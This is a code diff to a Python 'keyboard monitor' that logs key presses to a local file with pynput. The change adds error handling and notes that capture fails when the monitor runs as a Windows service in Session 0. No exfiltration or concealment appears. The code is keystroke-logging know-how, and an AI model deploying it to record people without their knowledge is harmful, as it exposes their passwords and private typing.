@@ -1,6 +1,9 @@
 """
 Keyboard monitor – logs key presses to a local log file.
-Uses pynput so it works without elevated privileges.
+Uses pynput so it works without elevated privileges (when not in Session 0).
+
+NOTE: In Windows Service (Session 0), keyboard capture will fail gracefully
+and log a warning. This is expected behavior.
 """
 
 import os
@@ -31,18 +34,29 @@ class KeyboardMonitor:
     def start(self):
         os.makedirs(config.LOGS_DIR, exist_ok=True)
         self._stop_event.clear()
-        self._listener = keyboard.Listener(on_press=self._on_press)
-        self._listener.start()
-        self._flush_thread = threading.Thread(
-            target=self._flush_loop, daemon=True, name="keyboard-flush"
-        )
-        self._flush_thread.start()
-        logger.info("KeyboardMonitor started")
+        try:
+            self._listener = keyboard.Listener(on_press=self._on_press)
+            self._listener.start()
+            self._flush_thread = threading.Thread(
+                target=self._flush_loop, daemon=True, name="keyboard-flush"
+            )
+            self._flush_thread.start()
+            logger.info("KeyboardMonitor started")
+        except Exception as e:
+            logger.warning(
+                "Failed to start keyboard monitor: %s. "
+                "This is normal if running in Session 0 (Windows Service). "
+                "Keyboard logging will be unavailable.",
+                e
+            )
 
     def stop(self):
         self._stop_event.set()
         if self._listener:
-            self._listener.stop()
+            try:
+                self._listener.stop()
+            except Exception as e:
+                logger.debug("Error stopping keyboard listener: %s", e)
         if self._flush_thread:
             self._flush_thread.join(timeout=10)
         self._flush()
